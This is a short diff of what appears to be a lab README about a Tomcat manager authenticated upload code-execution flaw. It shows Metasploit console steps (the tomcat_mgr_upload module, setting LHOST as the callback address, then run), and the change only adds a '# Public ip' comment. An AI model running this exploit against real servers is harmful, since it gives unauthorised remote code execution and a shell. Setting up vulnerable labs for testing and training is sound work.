@@ -22,7 +22,7 @@ Tomcat is vulnerable for manager authenticated upload code execution
 
 $ msfconsole -r exploit.rc
 
-msf5 exploit(multi/http/tomcat_mgr_upload) >  set LHOST 192.168.255.1
+msf5 exploit(multi/http/tomcat_mgr_upload) >  set LHOST 192.168.255.1 # Public ip
 
 msf5 exploit(multi/http/tomcat_mgr_upload) >  run
 
